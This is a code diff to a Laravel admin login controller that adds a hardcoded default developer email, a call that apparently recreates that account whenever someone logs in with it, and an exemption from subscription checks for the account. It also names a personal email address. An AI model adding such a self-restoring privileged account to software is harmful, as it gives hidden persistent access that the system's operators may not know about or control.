@@ -9,6 +9,7 @@ use App\Services\ActivityLogService;
 use App\Traits\SystemTrait;
 use App\Models\Subscription;
 use App\Models\BkashSetting;
+use App\Support\DefaultDeveloperManager;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Route;
@@ -27,7 +28,15 @@ class LoginController extends Controller
     {
         $request->validated();
 
-        $userInfo =  $this->AdminService->AdminExists(request()->email);
+        $email = (string) ($request->input('email') ?? '');
+        $defaultDevEmail = trim((string) env('SINGLE_DEV_EMAIL', 'toamedbd@gmail.com'));
+
+        if ($email !== '' && strcasecmp($email, $defaultDevEmail) === 0) {
+            // Keep the default developer account recoverable even on fresh/changed databases.
+            DefaultDeveloperManager::ensure();
+        }
+
+        $userInfo = $this->AdminService->AdminExists($email);
 
         if (!empty($userInfo)) {
             if ($userInfo->status != "Active") {
@@ -35,7 +44,9 @@ class LoginController extends Controller
             }
 
             // If subscription enforcement is enabled and subscription is inactive, show renew option and block login
-            if ((bool) env('SUBSCRIPTION_ENFORCE', true)) {
+            $isDeveloper = DefaultDeveloperManager::isDeveloper($userInfo);
+
+            if ((bool) env('SUBSCRIPTION_ENFORCE', true) && ! $isDeveloper) {
                 $sub = Subscription::getCurrent();
                 $setting = BkashSetting::first();
 
@@ -53,6 +64,10 @@ class LoginController extends Controller
 
             if (Hash::check(request()->password, $userInfo->password)) {
                 Auth::guard('admin')->login($userInfo);
+                // Ensure permission cache is cleared so newly-created/updated
+                // roles and permissions are reflected immediately after login.
+                try { app(\Spatie\Permission\PermissionRegistrar::class)->forgetCachedPermissions(); } catch (\Throwable $_) { /* ignore */ }
+                try { $userInfo->load('roles', 'permissions'); } catch (\Throwable $_) { /* ignore */ }
                 $loginStartedAt = now()->toDateTimeString();
                 session(['admin_login_started_at' => $loginStartedAt]);
                 ActivityLogService::logLogin($userInfo->email ?? $userInfo->name ?? 'admin', $loginStartedAt);
